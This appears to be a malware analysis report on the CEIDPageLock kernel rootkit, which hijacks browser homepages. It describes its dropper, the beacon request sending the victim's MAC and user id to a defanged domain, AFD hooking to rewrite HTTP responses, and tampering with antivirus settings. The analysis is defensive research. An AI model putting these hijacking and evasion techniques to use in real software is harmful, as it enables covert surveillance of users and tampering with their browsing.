CeidPageLock: A Chinese RootKit
Research by: Israel Gubi
Over the last few weeks, we have been observing a rootkit named CEIDPageLock being
distributed by the RIG Exploit kit.
The rootkit was ﬁrst discovered by 360 Security Center a few months ago, when it was
detected trying to tamper with the homepage of a victim’s browser. Indeed, that is exactly

detected trying to tamper with the homepage of a victim’s browser. Indeed, that is exactly
what CEIDPageLock is – a browser hijacker. It acts to manipulate the victim’s browser and
turn their home-page into a site pretending to be 2345.com – a Chinese web directory.
While already quite sophisticated for a browser hijacker, the new version of the rootkit
observed in the wild contains a few notable improvements that make it even more effective.
Chieﬂy among them is a new functionality that monitors user browsing and dynamically
replaces the content of several popular Chinese websites with the fake home page,
whenever the user tries to visit them.
Browser hijacking employed by malware like CEIDPageLock, can be proﬁtable due to
revenue earned via redirecting victims to search engines that share ad revenue with the
referrers. Additionally, CEIDPageLock operators uses the various hijacking tricks in order
to gather browsing data on its victims – monitoring the sites users visit and how long they
spend on those web pages. They then either use the information themselves to target their
ad campaigns or sell it to other companies that use the data to focus their marketing
content.
Based on Check Point’s global sensors, CEIDPageLock targets Chinese victims in particular
while there are a negligible number of infections outside of china.

The Dropper
PDFmyURL lets you convert a complete website to PDF automatically!

The dropper’s main responsibility is to extract the driver which resides within the ﬁle and to
save it in “\\Windows\\Temp” directory with the name “houzi.sys” (older version of the
driver was named “CEID.sys” – which is the reason for the malware’s name).
The dropped driver has a certiﬁcate signed by
[+] 浙江恒歌网络科技有限公司
[+] Thawte Code Signing CA – G2
[+] thawte
although, this certiﬁcate has actually been revoked by the issuer.
After registering and starting the driver, the dropper sends the mac address and user-id of
the poisoned computer to the domain www[.]tj999[.]top with the following header:
“GET /tongji.php?userid=%s&mac=%s HTTP/1.1”

The Driver
The driver is a 32-bit kernel-mode driver that is launched among the standard system
drivers during startup. The driver is fairly stealthy, employing tricks to evade and hide from
endpoint security products. Its main functionality is connecting with one of 2 C&C hardcoded domains in order to download the desired homepage conﬁguration to tamper the
browser with. The home page is downloaded encrypted from the C&C server while using
the following headers:

The decrypted homepage is taken from the site 588[.]gychina[.]org and the URL of the
hijacked homepage is 111[.]l2345[.]cn. It pretends to be 2345.com but down the surface
gathers stats on the victim and makes proﬁt from every search query the user makes in that
page.

A further deep technical analysis for the older version can be found in 360 Security’s
publication. Below we will highlight some of the interesting additions and differences
between the older and newer versions.
Differences between versions
* In contrast to the ﬁrst version, the newer version of the rootkit is packed with VMProtect,
which makes analysis and unpacking difﬁcult, especially for kernel mode drivers.

A major addition in the new version is a “redirection” method that sends victims to the fake
homepage whenever they are attempting to visit several popular Chinese websites. When
the rootkit starts it opens “\\Driver\\AFD” and hooks its AfdFastIoDeviceControl method.
Using this method, the rootkit checks every outgoing HTTP message for one of the following
strings:

Figure 6: Searched strings in the url for redirection to hijacked homepage.
In case one of these strings is found in the HTTP packet, the rootkit adds the process to a
“redirected processes” list. Then, the rootkit checks in every received message whether the
process who called the recv method belongs to that list, and if so, it modiﬁes the response
content to the contents of the 111[.]l2345[.]cn page. This method is sneakier than performing
an actual HTTP redirection, since the URL displayed in the browser is not altered.

As written in 360 safe security analysis on the older version, CEIDPageLock blocks
browsers from accessing number of anti-virus’ ﬁles. In the new version, CEIDPageLock has
added more anti-virus ﬁles to that method:

The authors added a method of creating registry key in safemon- 360safe’s security product,

as part of the rootkit installation routine. The rootkit sets the value – 0 under the registry
key: “\Registry\Machine\Software\Wow6432Node\360Safe\safemon\ATHPJUMP”

Conclusion
At ﬁrst glance, writing a rootkit that functions as a browser hijacker and employing
sophisticated protections such as VMProtect, might seem like overkill. However, it seems
that this simple malicious technique can be very proﬁtable and thus the attackers believe
that it is worthwhile to invest in building a stealthy and persistent tool for it.
Also, while CEIDPageLock might seem merely bothersome and hardly dangerous, the
ability to execute code on an infected device while operating from the kernel, coupled with
the persistence of the malware, makes it a potentially perfect backdoor.
